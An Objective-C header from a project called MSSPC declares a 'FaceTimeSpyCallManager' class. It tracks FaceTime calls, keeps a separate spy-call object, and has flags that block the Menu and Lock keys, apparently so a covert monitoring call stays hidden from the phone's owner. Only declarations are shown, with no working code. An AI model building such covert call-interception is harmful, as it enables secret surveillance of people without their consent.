//
//  FaceTimeSpyCallManager.h
//  MSSPC
//
//  Created by Makara Khloth on 7/9/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

@class FaceTimeCall;
@class CNFDisplayController;
@class CNFCallViewController, IMHandle;

@interface FaceTimeSpyCallManager : NSObject {
@private
	FaceTimeCall	*mFaceTimeSpyCall;
	FaceTimeCall	*mFaceTimeCall;     // Last incoming FaceTime call regardless of spy call or not
	NSMutableArray	*mFaceTimeCalls;
	
	CNFDisplayController	*mCNFDisplayController;
	CNFCallViewController	*mCNFCallViewController;
	
	BOOL	mBlockMenuKeyUp;
	BOOL	mBlockLockKeyUp;
    
    BOOL	mIsFaceTimeSpyCallCompletelyHangup;
}

@property (nonatomic, retain) FaceTimeCall *mFaceTimeSpyCall;
@property (nonatomic, retain) FaceTimeCall *mFaceTimeCall;
@property (nonatomic, readonly) NSMutableArray *mFaceTimeCalls;

@property (nonatomic, retain) CNFDisplayController *mCNFDisplayController;
@property (nonatomic, retain) CNFCallViewController *mCNFCallViewController;

@property (nonatomic, assign) BOOL mBlockMenuKeyUp;
@property (nonatomic, assign) BOOL mBlockLockKeyUp;

@property (nonatomic, assign) BOOL mIsFaceTimeSpyCallCompletelyHangup;

+ (id) sharedFaceTimeSpyCallManager;

- (void) handleIncomingFaceTimeCall: (FaceTimeCall *) aFaceTimeCall;
- (void) handleIncomingWaitingFaceTimeCall: (FaceTimeCall *) aFaceTimeCall;
- (void) handleFaceTimeCallEnd: (FaceTimeCall *) aFaceTimeCall;

- (void) endFaceTimeSpyCall;

- (void) endFaceTime;
- (BOOL) isInFaceTime;
- (void) endFaceTimeIfAny;

@end
